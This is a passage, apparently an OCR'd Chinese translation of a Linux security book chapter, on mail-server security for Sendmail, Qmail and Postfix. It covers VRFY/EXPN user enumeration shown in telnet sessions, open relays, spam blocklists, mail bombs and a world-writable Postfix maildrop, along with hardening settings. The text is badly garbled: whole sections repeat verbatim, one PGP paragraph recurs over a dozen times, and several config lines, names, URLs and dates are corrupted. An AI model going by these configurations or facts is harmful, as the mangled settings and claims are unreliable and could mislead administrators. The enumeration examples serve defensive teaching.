当作为 SMTP 服务器运行时，Qmail 必须绑定 25 端口。而 Sendmail 使用 `tcserver` 以非 root 用户身份启动单个 `qmail-smtpd` “守护进程”。如果无法用 `tcserver`，可以使用 `inetd`。该守护进程永远不会以 root 权限运行。

Qmail 是开源的，但受限制性许可证保护。为了保持对代码的控制，作者坚持要求在分发二进制文件时批准对源码的任何更改。不过，欢迎您按意愿对自己的副本进行任何更改。事实上，Qmail 网页提供了许多用户提供的补丁和插件的示例。

##### Postfix

`Postfix` (`www.postfix.org`) 由 IBM 的 Wietse Venema（TCP wrappers 作者）编写，作为 Sendmail 的一种易于配置且安全的替代方案。它最初被称为 VMailer，于 1998 年作为 IBM Secure Mail 发布，后来更名为 Postfix。它是一个根据 IBM 公共许可证发布的开源产品。正如 Venema 在 Postfix README 文件中所说：

“尽管 IBM 支持 Postfix 的开发，但它放弃了对其演进的控制。目标是让 Postfix 安装在尽可能多的系统上。为此，该软件免费提供且不附带任何条件，以便它能够在用户的输入和控制下演进。换句话说，IBM 仅发布一次 Postfix。我将在有限的时间内指导它的开发。”

### 第 11 章：邮件和 FTP 服务

与 Qmail 类似，Postfix 将其功能划分为许多微小的自定义程序，而不是一个单体二进制文件。例如，主程序处理绑定 25 端口并将连接交给 `smpd` 程序，后者以 `postfix` 用户身份运行，从而极大地减少了 root 被攻破的风险。可选的 `drop` 二进制文件是唯一的 setgroup 程序，Postfix 中完全没有 setuserid 二进制文件。

此外，大多数 Postfix 进程在 `chroot` 监狱中作为独立的 postfix 用户和用户组运行。一旦发现漏洞，黑客将只能访问邮件数据本身而无法访问 root 文件系统，并且在产生任何实际影响之前，需要使用有限的工具创建 root 账户。

Postfix 尝试以所有可能的方式与 Sendmail 。然而，由于架构差异，这并不总是可能的。例如，`sendmail -v` 命令将无法工作，因为 sendmail 提交封装并不处理消息传递。某些 Sendmail 功能默认未开启——例如，邮件在四小时后无法递送时发送警告。不兼容列表请参阅 `http://www.postfix.org/faq.html`。

## 邮件服务器安全性

邮件服务器面临着一些相同的潜在安全风险，我们将详细介绍 Sendmail、Qmail 和 Postfix 分别如何处理这些问题。然而，你必须采取的最重要的措施是加入你所选择的邮件服务器的安全邮件列表，并在必要时做好升级准备。虽然距离上次在这三者中任何一个上发现严重的安全漏洞已经有一段时间了，但潜在风险一直存在。你只需要回顾 Bugtraq 存档，就能看到曾经发现的字符串漏洞（string bugs）曾是多么脆弱。

> 如果你的机器不接收邮件，那么你根本不需要将邮件程序作为邮件服务器运行，这使得网络攻击变得不可能。你仍然可以依靠它发送外发邮件；只需不要让它监听 SMTP 端口即可。例如，Sendmail 只有在带有 `-bd` 标志运行时才会监听连接。运行 `sendmail -q1h` 将允许它发送外发邮件并在每小时在队列中重试一次，而永远不监听入站邮件。



# 邮件服务器中的 Root 漏洞

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 9 |
| 简单性 | 9 |
| 影响 | 10 |
| 风险评分 | 9 |

邮件服务器最大的问题是它们需要绑定 25 端口，因此必须由 root 启动。如果在服务器中发现漏洞，黑客可能直接获得 root 权限，而无需从低权限账户发起攻击。Sendmail 曾经历过每隔一个月就会发现一个直接 root 漏洞的时期。

## 破解 Linux 暴露：Linux 安全秘密与解决方案

Postfix 最重要的要求之一是守护进程不以 root 身份运行。Qmail 最重要的要求之一是守护进程不以 root 身份运行。

## 作为独立用户运行邮件服务器

Sendmail 在 `sendmail.cf` 中提供了 `RunAsUser` 选项。如果设置，Sendmail 将使用配置中指定的用户运行守护进程。这允许你以非特权用户运行 Sendmail。

## 邮件服务器横幅

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 7 |
| 简单性 | 10 |
| 影响 | 4 |
| 风险评分 | 7 |

SMTP 服务器在建立连接时会显示横幅。这些横幅通常包含软件名称、版本号和当前时间，如此所示。

### 修改 Postfix 的 SMTP banner

通过修改 `main.cf` 中的默认值，可以轻松更改 banner：

```
smtpd_banner = $hostname SMTP $mail_name
smtmtpd_banner = $hostname SMTP $mail_name ($mail_version)
```

将其改为更有趣且更少暴露信息的内容：

```
smtpd_banner = mail.example.org SMTP Avoid the Gates of Hell - Use Linux
```

## SMTP VRFY 命令

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 10 |
| 影响 | 5 |
| 风险等级 | 7 |

VRFY 命令最初用于帮助机器确定用户名或电子邮件地址是否有效，但现在很少用于此目的。相反，它通常被黑客用于暴力破解猜测用户名（然后可以用于对其他网络服务进行用户名/密码猜测），或被垃圾邮件发送者用于收集他们可以添加到列表中的新邮箱地址。

```
hbox telnet mailserver.example.com 25
Trying 192.168.1.100...
Connected to example.com (192.168.1.100).
Escape character is '^'
220 anything.example.com SMTP Sendmail 8.9.3/8.9.3; Sun, 25 Feb 2001 -0800
VRFY luser
250 J. Random User <user@mailserver.example.com>
quit
221 mailserver.example.com closing connection
Connection closed by foreign host.
```

攻击者现在知道了一个用户，并可以根据个人信息开始猜测密码，或者冒充系统管理员、电话推销员或其他邪恶分子打电话。寻找用户名本身可能不是一种黑客攻击，但它通常是进一步攻击的跳石。

### 在 Sendmail 中关闭 VRFY

如果你正在监控系统日志，可能会看到如下条目：

```
sendmail [3209]: IDENT:cracker@hacker_central.com [192.168.1.100]: VRFY luser
```

黑客可能不会好到从自己的机器连接；相反，他会从某个之前被黑过的系统连接——如果你不小心，可能就是你的系统。你可以通过如下所示更改 `PrivacyOptions` 标志来在 `sendmail.cf` 中拒绝 VRFY 请求：

# privacy flags
O PrivacyOptions=authwarnings,novrfy

或者你可以在 `sendmail.mc` 配置文件中添加以下行并重新编译 `sendmail.cf`

```
define(`confPRIVACY_FLAGS`,`authwarnings,novrfy`) dnl
```

进行这些更改后，重启或重载 Sendmail 以加载配置：`killall -HUP sendmail`

当用户尝试 VRFY 命令时，他们将看到以下响应：

VRFY user

252 Cannot VRFY user; try RCPT to attempt delivery (or try finger)

你会在 syslog 中发现：

```
sendmail[3237]: NOQUEUE: [192.168.1.100]: VRFY user [rejected]
```

提示 有其他可用的 PrivacyOptions。详情请参 Sendmail 文档。

### Qmail 和 Postfix 的 VRFY 响应

Qmail 和 Postfix 都会对任何 VRFY 请求返回 252 响应。Postfix 总是返回带有 252 响应码的电子邮件地址，仿佛在说：“是的，这是一个法的地址。”Qmail 则诚实一点，它并没有真正对待 SMTP 客户端：

```
VRFY user@example.com
252 send some mail, i'11 try my best.
```

因此，这两台邮件服务器开箱即是安全的。

## SMTP EXPN 命令

| 流行度: 6 |
| 简单性: 10 |
| 影响: 5 |
| 风险等级: 7 |

EXPN 命令可用于展开提供的用户名或电子邮件地址。与 VRFY 命令一样，它可以被用于猜测用户名和电子邮件地址。然而。

### Linux 黑客暴露：Linux 安全秘密与解决方案

如果该地址是展开到多个地址的别名，它将报告实际生成的电子邮件地址：

```
hackerbox$ telnet mailserver.example.com 25
Trying 192.168.1.100...
Connected to example.com (192.168.1.100).
Escape character is ' ]'.
```

+ 220 anything.example.com SMTPP Sendmail 8.9.3/8.9.3; Sun, 25 Feb 2001

250-<jim@example.org>

250-<carol@example.org>

250-<taxee@all_dogs.net>

250-<harper@all_dogs.net>

250-<tuffy@all_dogs.net>

在这种情况下，垃圾邮件发送者已经能够提供了五个电子邮件地址。黑客可能会发现查看你的邮件是如何处理的更有趣：

```
220 example.com SMTP Sendmail 8.9.3/8.9.3; Sun, 25 Feb 2001
EXPN biglist@example.com
220 2.1.5 <|etc/smrish/mailinglist.listlist
```

在这种情况下，垃圾邮件发送者已经提供了五个电子邮件地址。黑客可能会发现查看你的邮件是如何处理的更有趣：

```
220 example.com SMTP Sendmail 8.9.3/8.9.3; Sun, 25 Feb 2001
EXPN biglist@example.com
220 2.1.5 <|etc/smrish/mailinglist
```

在这种情况下，垃圾邮件发送者已经提供了五个电子邮件地址。黑客可能会发现查看你的邮件是如何处理的更有趣：

```
220 example.com SMTP Sendmail 8.9.3/8.9.3; Sun, 25 Feb 2001
EXPN biglist@example.com
220 2.1.5 <|etc/smrish/mailinglist
```

（注：后续 OCR 文本存在重复和乱码，已根据逻辑流进行清理处理。）

# 第 11 章：邮件与 FTP 安全

**注意** 如果非 root 用户必须能够修改这些文件，人们可能想创建一个用户集程序来帮助他们进行更改。我们建议您在执行此操作时要非常小心，因为您的辅助程序本身可能会受到攻击。

## 邮件中继 (Email Relaying)

| 流行度: 8 |
| 简单性: 6 |
| 影响: 8 |
| 风险等级: 7 |

中继并不是一种可以获取未经授权权限的攻击，但它会让你在网络上产生“体味”。在网络还是一个更美好、更互信的时候，每个人的邮件服务器都会为其他人托管中继邮件；也就是说，如果你的机器邮件服务器 mail.example.com 收到封来自 spammer@bad_karma.com、发给 sucker@other_domain.com 的邮件，你的机器会说：“这不属于我或我的网络，但我会帮把它发出去。”



随着垃圾邮件（通常称为 `UCE`，即未经请求的商业邮件）变得普遍，用户开始采取措施屏蔽已知垃圾邮件发送者的 `IP` 地址。垃圾邮件者通过寻找被称为“开放中继”（`open relays`）的邮件服务器来为他们中继邮件来反击。由于这些 `IP` 地址没有被屏蔽，垃圾邮件的邮件就能到达接收者手中。事实上，通过中继，垃圾邮件者可以从第三方机器发送一封包含 500 个收件者的邮件，而该机器必须花费其资源将该邮件发送到 500 个单独的目标。与此同时，垃圾邮件者本人可以坐下来休息，让机器空闲。因此，大多数垃圾邮件预防措施现在都会屏蔽垃圾邮件源 `IP` 地址和任何已知的开放中继。

# 开放中继防御措施

为了防止你的机器和网络被垃圾邮件者滥用，请确保你不会受到未经授权域的中继攻击。

`Sendmail` 版本 8.9 默认拒绝中继。如果你有应该具有中继能力的主机，可以将地址添加到 `/etc/mail/access` 文件中，如下所示：

```
localhost RELAY
internal.domain.example.com RELAY
```

## 破解 Linux 揭秘：Linux 安全秘密与解决方案

> 注意

`Sendmail` 将您的域名视为完整名称中主机部分之后的所有内容。如果您在 `.mc` 文件中使用 `FEATURE(relay_entire_domain)` 并有任何解析为二级域名的本地 `IP` 地址（例如 `example.com`），那么您将允许域名中的所有机器中继。不幸的是，它会认为域名是 `.com`，而您现在实际上变成了一个开放中继。

`Qmail` 0.91 及以上版本默认允许中继。您可以使用两种方法允许特定主机进行中继：

- 安装带有 `host_options` 支持的 `TCP` wrappers。按如下方式运行 `Qmail` `smtpd` 进程：

```
tcpd /var/qmail/bin/tcp-env /var/qmail/domain/bin/qmail-smtpd
```

并向 `/etc/hosts.allow` 添加类似下方的行，适用于所有允许中继的主机：

```
tcp-env: 10.10.10.10 : setenv = RELAYCLIENT
```

- 如果是 `Tcpserver` 0.80 或更高版本，在 `/etc/tcp.smtp` 中添加类似下面的行：

```
10.10.10:allow,RELAYCLIENT=""
```

然后运行

```
tcprules /etc/tcp.smtp.mdb /etc/tcp.smtp.tmp < /etc/tcp.smtp
```

并添加

```
-x /etc/tcp.smtp.cd
```

`Postfix` 一直默认拒绝中继。事实上，在首次运行之前，必须配置接收和发送邮件的网络，这在 `main.cf` 变量 `hostname`, `myorigin`, `mydestination` 和 `mynetworks` 中完成的。对于许多系统，这些是您为获得可用的 `Postfix` 配置而唯一需要处理的变量。

不幸的是，由于 `SMTP` 服务器对实际的邮件投递一无所知，早期版本（1991-12-27 之前）在尝试中继时不会对 `SMTP` 错误做出响应。因此，`ORBS` 或 `RBL` 等中继检查器可能认为它是开放中继。升级到较新版本的 `Postfix` 以避免这个问题。

# 第 11 章：邮件与 FTP 安全

## 垃圾邮件 (Spam)

| 流行度 | 10 |
| 简单性 | 10 |
| 影响 | 4 |
| 风险等级 | 8 |

垃圾邮件浪费你的磁盘空间，占用带宽，并无缘无故地使用你的 `CPU`。许多资深系统管理员已被迫编写复杂的 `Procmail` 规则，以保护他们的键盘不被过度使用。（任何使用鼠标删除邮件的人从定义上来说都不是资深管理员，可能根本不会触碰 `Procmail`。）垃圾邮件通常包含 `HTML` 代码，旨在自动将你重定向到违规者的网站、收集关于你的数据、用于验证有效邮箱地址的 `Web` 虫，或者只是移除你浏览器中的功能栏，让你无法逃避他们的他们的废话。单条垃圾邮件可能包含攻击，也可能不包含，但它们确实对你来说没有合法的用途。

## 拦截垃圾邮件

最广泛使用的垃圾邮件预防方法是 `MAPS`（邮件滥用预防系统——方便的是，“spam”反过来写就是 `MAPS`）实时黑洞列表，或 `RBL` (`http://mail-abuse.org/rbl/`)，它最初由 Paul Pixie 创建。这是一个通过 `DNS` 提供的服务，列出了已知的垃圾邮件发送者或垃圾邮件发送者使用的开放中继机器。采用 `DNS` 垃圾邮件预防的邮件服务器会对所有连接它的机器的 `IP` 地址进行 `DNS` 查询。如果该 `IP` 已注册，则将不接受来自它的邮件。`Orbs`（开放中继修改系统，位于 `http://www.orbs.org`）是另一个流行的数据库，仅列出开放中继。

在下面的示例中，我们将展示如何使用域名 `rbl.maps.vix.com` 启用 `RBL` 保护。对于 `MAPS` 和 `ORBS` 域，请查看各自的页面。

`Sendmail` 垃圾邮件预防你可以通过向 `sendmail.mc` 添加行来添加垃圾邮件保护。不幸的是，每个版本的 `Sendmail` 语法都不同。

| 版本 | sendmail.mc 条目 |
|---|---|
| 8.9 | `FEATURE(rbl, `rbl.maps.vix.com`)` |
| 8.10 | `FEATURE(dnsbl, `vix.com`, `error message`)` |
| 8.11 | `HACK(`check_dnsbl`, `vix.com`, `general`, `reason`)` |

## 破解 Linux 揭秘：秘密

`Qmail` 垃圾邮件预防为了防止你的机器和网络被垃圾邮件者滥用，请确保你不会受到未经授权域的中继攻击。

`Sendmail` 版本 8.9 默认拒绝中继。如果你有应该具有中继能力的主机，可以将地址添加到 `/etc/mail/access` 文件中，如下所示：

```
localhost RELAY
internal.domain.example.com RELAY
```

> 注意

`Sendmail` 将您的域名视为完整名称中主机部分之后的所有内容。如果您在 `.mc` 文件中使用 `FEATURE(relay_entire_domain)` 并有任何解析为二级域名的本地 `IP` 地址（例如 `example.com`），那么您将允许域名中的所有机器中继。不幸的是，它会认为域名是 `.com`，而您现在实际上变成了一个开放中继。

`Qmail` 0.91 及以上版本默认允许中继。您可以使用两种方法允许特定主机进行中继：

- 安装带有 `host_options` 支持的 `TCP` wrappers。按如下方式运行 `Qmail` `smtpd` 进程：

```
tcpd /var/qmail/bin/tcp-env /var/qmail/domain/bin/qmail-smtpd
```

并向 `/etc/hosts.allow` 添加类似下方的行，适用于所有允许中继的主机：

```
tcp-env: 10.10.10.10 : setenv = RELAYCLIENT
```

- 如果是 `Tcpserver` 0.80 或更高版本，在 `/etc/tcp.smtp` 中添加类似下面的行：

```
10.10.10:allow,RELAYCLIENT=""
```

然后运行

```
tcprules /etc/tcp.smtp.mdb /etc/tcp.smtp.tmp < /etc/tcp.smtp
```

并添加

```
-x /etc/tcp.smtp.cd
```

`Postfix` 一直默认拒绝中继。事实上，在首次运行之前，必须配置接收和发送邮件的网络，这在 `main.cf` 变量 `hostname`, `myorigin`, `mydestination` 和 `mynetworks` 中完成。对于许多系统，这些是您为获得可用的 `Postfix` 配置而唯一需要处理的变量。不幸的是，由于 `SMTP` 服务器对实际的邮件投递一无所知，早期版本（1991-12-27 之前）在尝试中继时不会对 `SMTP` 错误做出响应。因此，`ORBS` 或 `RBL` 等中继检查器可能认为它是开放中继。升级到较新版本的 `Postfix` 以避免这个问题。

# 垃圾邮件

| 流行度 | 10 |
| 简单性 | 10 |
| 影响 | 4 |
| 风险等级 | 8 |

垃圾邮件浪费你的磁盘空间，占用带宽，并无缘无故地使用你的 `CPU`。许多资深系统管理员已被迫编写复杂的 `Procmail` 规则，以保护他们的键盘不被过度使用。（任何使用鼠标删除邮件的人从定义上来说都不是资深管理员，可能根本不会触碰 `Procmail`。）垃圾邮件通常包含 `HTML` 代码，旨在自动将你重定向到违规者的网站、收集关于你的数据、用于验证有效邮箱地址的 `Web` 虫，或者只是移除你浏览器中的功能栏，让你无法逃避他们的废话。单条垃圾邮件可能包含攻击，也可能不包含，但它们确实对你来说没有合法的用途。

# 拦截垃圾邮件



最广泛使用的垃圾邮件预防方法是 MAPS（邮件滥用预防系统——方便的是，“spam”反过来写就是 MAPS）实时黑洞列表，或 RBL (`http://mail-abuse.org/rbl/`)，它最初由 Paul Pixie 创建。这是一个通过 DNS 提供的服务，列出了已知的垃圾邮件发送者或垃圾邮件发送者使用的开放中继机器。采用 DNS 垃圾邮件预防的邮件服务器会对所有连接它的机器的 IP 地址进行 DNS 查询。如果该 IP 已注册，则将不接受来自它的邮件。Orbs（开放中继修改系统，位于 `http://www.orbs.org`）是另一个流行的数据库，仅列出开放中继。

在下面的示例中，我们将展示如何使用域名 `rbl.maps.vix.com` 启用 RBL 保护。对于 MAPS 和 ORBS 域，请查看各自的页面。

Sendmail 垃圾邮件预防你可以通过向 `sendmail.mc` 添加行来添加垃圾邮件保护。不幸的是，每个版本的 Sendmail 语法都不同。

| 版本 | sendmail.mc 条目 |
|---|---|
| 8.9 | `FEATURE(rbl, `rbl.maps.vix.com`)` |
| 8.10 | `FEATURE(dnsbl, `vix.com`, `error message`)` |
| 8.11 | `HACK(`check_dnsbl`, `vix.com`, `general`, `reason`)` |

# 破解 Linux 揭秘：秘密

Qmail 垃圾邮件预防为了防止你的机器和网络被垃圾邮件者滥用，请确保你不会受到未经授权域的中继攻击。

Sendmail 版本 8.9 默认拒绝中继。如果你有应该具有中继能力的主机，可以将地址添加到 `/etc/mail/access` 文件中，如下所示：

```
localhost RELAY
internal.domain.example.com RELAY
```

> **注意**
> Sendmail 将您的域名视为完整名称中主机部分之后的所有内容。如果您在 `.mc` 文件中使用 `FEATURE(relay_entire_domain)` 并有任何解析为二级域名的本地 IP 地址（例如 `example.com`），那么您将允许域名中的所有机器中继。不幸的是，它会认为域名是 `.com`，而您现在实际上变成了一个开放中继。

Qmail 0.91 及以上版本默认允许中继。您可以使用两种方法允许特定主机进行中继：

- 安装带有 `host_options` 支持的 TCP wrappers。按如下方式运行 Qmail `smtpd` 进程：

```
tcpd /var/qmail/bin/tcp-env /var/qmail/domain/bin/qmail-smtpd
```

并向 `/etc/hosts.allow` 添加类似下方的行，适用于所有允许中继的主机：

```
tcp-env: 10.10.10.10 : setenv = RELAYCLIENT
```

- 如果是 `Tcpserver` 0.80 或更高版本，在 `/etc/tcp.smtp` 中添加类似下面的行：

```
10.10.10:allow,RELAYCLIENT=""
```

然后运行

```
tcprules /etc/tcp.smtp.mdb /etc/tcp.smtp.tmp < /etc/tcp.smtp
```

并添加

```
-x /etc/tcp.smtp.cd
```

Postfix 一直默认拒绝中继。事实上，在首次运行之前，必须配置接收和发送邮件的网络，这在 `main.cf` 变量 `hostname`, `myorigin`, `mydestination` 和 `mynetworks` 中完成。对于许多系统，这些是您为获得可用的 Postfix 配置而唯一需要处理的变量。不幸的是，由于 SMTP 服务器对实际的邮件投递一无所知，早期版本（1991-12-27 之前）在尝试中继时不会对 SMTP 错误做出响应。因此，ORBS 或 RBL 等中继检查器可能认为它是开放中继。升级到较新版本的 Postfix 以避免这个问题。

# 垃圾邮件

| 流行度 | 10 |
| 简单性 | 10 |
| 影响 | 4 |
| 风险等级 | 8 |

垃圾邮件浪费你的磁盘空间，占用带宽，并无缘无故地使用你的 CPU。许多资深系统管理员已被迫编写复杂的 Procmail 规则，以保护他们的键盘不被过度使用。（任何使用鼠标删除邮件的人从定义上来说都不是资深管理员，可能根本不会触碰 Procmail。）垃圾邮件通常包含 HTML 代码，旨在自动将你重定向到违规者的网站、收集关于你的数据、用于验证有效邮箱地址的 Web 虫，或者只是移除你浏览器中的功能栏，让你无法逃避他们的废话。单条垃圾邮件可能包含攻击，也可能不包含，但它们确实对你来说没有合法的用途。

# 邮件炸弹和其他拒绝服务

| 流行度 | 5 |
| 简单性 | 7 |
| 影响 | 8 |
| 风险等级 | 7 |

如果一个黑客决定不喜欢你，他可以让你遭受拒绝服务（DoS）攻击，例如向你的端口灌入大量信息，也称为邮件炸弹。因此，

# 在 Sendmail 中强制限制资源

有多种 Sendmail 选项可以设置以限制守护进程的资源量：

| MaxDaemonChildren | 限制同时运行的 Sendmail 进程数量。有利于保护 CPU 利用率。 |

# 第 11 章：邮件与 FTP 安全

| | |
|---|---|
| ConnectionRateThrottle | 限制每秒允许的入站连接数。 |
| MaxRceptsPerMessage | 限制单条邮件接收者数量。有助于防止构造不良的垃圾邮件。 |
| MaxMessageSize | 拒绝过邮件。如果经常交换大文件，可能会出现问题；然而，文件服务通常通过 HTTP、FTP 完成。 |

**注意** 将这些变量设置得过低会导致邮件延迟或拒绝，因此在设置之前，请检查邮件日志以确定您的使用情况。

# 在 Qmail 中强制限制资源

Qmail 默认仅允许在时刻处理发送邮件。如果你有大量的发送邮件，例如你正在支持邮件列表，你可能需要将其发出以释放磁盘空间。只需将你希望支持的并发发送数放入 `/var/qmail/control/concurrencyremote` 文件并重启 Qmail。编译时限制为 120，尽管你可以在编译时在 `conf-spawn` 中更改它。

`mail` 不实施额外的限制。Bernstein 认为实施进一步限制是系统的目的。因此，您应该直接通过 `/etc/limits.conf` 实施限制，并对 `/var` 使用磁盘配额。例如，为了限制 Qmail 队列中的邮件量，您将对 `qmail` 用户设置 `/var` 分区的 inode 限制。

# 在 Postfix 中强制限制资源

Postfix 拥有最广泛且经过优化的内置邮件炸弹和攻击防御。最快的解决方案是在 `main.cf` 中设置 `default_limit` 变量。该变量限制了随时运行的 Postfix 进程（`smtpd`、`postdrop` 等）的总数。它的默认值为 50，对于普通系统来说可能足够。如果你希望更精细地控制允许哪些 Postfix 进程，可以按服务进行控制：

```
#
=================================================================
# service type unpriv chroot wakeup maxproc command + args
# (yes) (yes) (never) (50)
#
```

# Linux 攻击揭秘：Linux 安全与解决方案

===========================================================

===========================================================

`smtp inet n - - - 10 smtpd.`

我们限制了机器，任何时候都不允许超过十条并发 SMTP 消息。其他的 `main.cf` 变量包括：

| local_destination_concurrency_limit | 同时投递给同一收件者的消息数量。 |
| default_destination_concurrency_limit | 同时发送给同一收件者的消息数量。 |
| message_size_limit | 任何大于此大小的消息都将被拒绝。 |
| bounce_size_limit | 在邮件退回时，返回给发送者的邮件大小。发送整封邮件可能被认为是昂贵且没必要的。 |
| queue_minfree | 队列文件系统应保留多少空间；有助于防止 Postfix 在文件系统填满之前接受新消息。 |

还有许多其他变量可以根据喜好进行调整。请查看文档以及 `http://www.postfix.org/resource.html` 和 `http://www.postfix.org/` 以获取速率和速率限制选项。

# Postfix 全局可写邮件投递目录

| 流行度: 5 |
| 简单性: 5 |
| 影响: 4 |
| 风险评分: 5 |



Postfix 首次发布时，吹称该套件中没有任何程序被设置为 `userid` 或 `setgroupid`。所有投递的邮件都由一个 Postfix 程序简单写入邮件投递目录，然后由另一个 Postfix 守护进程将其提取并进行适当投递。

# 第 11 章：邮件与 FTP 安全

然而，为了让所有用户都能向此目录发送邮件，它需要具有全局可写权限。设置了粘滞位（sticky bit），就像 `/tmp` 中一样，以确保用户无法在邮件被处理之前删除对方的邮件。不幸的是，该系统仍然可能受到其他与邮件相关的攻击。

Postfix 会丢弃邮件投递目录中任何具有多一个硬链接的文件。由于该目录是全局可写的，任何人都可以为队列中的文件创建额外的链接。这些文件（电子邮件）将被删除且永远不会发送，并且不会向用户发送警告。

另一种可能性是强制发送另一个用户的文件。然而，满足这些条件非常困难。受害者的文件必须是 700 模式，必须与邮件投递目录位于同一个文件系统中，必须是 Postfix 可接受的格式，必须可以被攻击者链接，并且必须在链接创建后由受害者删除。这些要求是不可能实现的，但并不罕见。

> 这些缺陷最初由 Qmail 的作者 Bernstein 指出。Venema 和 Bernstein 曾就两个系统的相对安全性公开斗争一段时间。你可以在 http://cr.py.to/maildisasters/postfix.html 阅读 Bernstein 的观点。

## 全局可写邮件投递目录的对策

Venema 最初不愿修复这个问题，起初似乎只有一种解决方案：一个 `setgroup` 二进制文件。然而，他被迫承认这是唯一的解决方案，并制作了一个名为 `postdrop` 的程序，该程序被设置为 `setgroupid`。邮件投递目录的权限设置为 1730，并将其 ID 设置为与 `postdrop` 程序相同，这样它就可以写入该投递目录。如果 Postfix `sendmail` 包装器发现无法写入邮件投递目录，会自动调用 `postdrop`。

在安装和配置 Postfix 时，它会询问你 `setgroup` 组名。如果指定了，它将安装 `setgroupid` 的 postfix 程序并使用限制性的目录权限。否则，它将使用全局可写目录。

如果你的系统仅由和你信任的人使用，那么全局可写的邮件投递目录可能是没问题的。如果不是，你应该配置 Postfix 让邮件投递程序具有 `setgroupid`。

| 流行度: | 5 |
| --- | --- |
| 简单性: | 6 |
| 影响: | 7 |
| 风险评分: | 6 |

尽管你系统上的电子邮件只有你（以及 root）可以读取，但它们是以明文在网络上传输的。这意味着你发送的所有邮件对于任何能够嗅探你的机器与目标之间连接的人都是可见的。由于邮件经常通过不同的中继路由（例如对于企业内部网），因此在每一步，黑客或仅仅是不道德的管理员都可以获取。理论上，任何中继你邮件的系统如果需要，都会保留一份，即使是存储原始未加密位数据的磁盘，如果强大的组织决定恢复即使被删除的数据，也应该显示出来。

某些 SMTP 服务器和客户端开始支持 `SMTP-AUTH`，这是 SMTP 的一个扩展，允许用户向服务器进行身份验证。这通常用于允许在通常会被拒绝的情况下进行中继，例如合法用户从家庭拨号账户连接到公司的邮件服务器。此用户名和密码通常与 Linux 账户相同，这可能会产生灾性的安全影响。

## 电子邮件与 SMTP 加密

如果你的邮件包含敏感数据，你不应该在不加密的情况下发送它。任何现代客户端都有可用的钩子——如果没有，按照定义它就不是现代的。最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。

最广泛支持的加密是 `PGP`。对于我们的 `PGP` 软件，我们倾向于 `GnPG`，即 `GNU Privacy Guard`，可以在 http://www.gnupg.org 获取（以及那些烦人的密码学法）。许多在美国境外编写的邮件客户端（如 `Mutt`、`Pine` 和 `Elm`）支持 `PGP`。



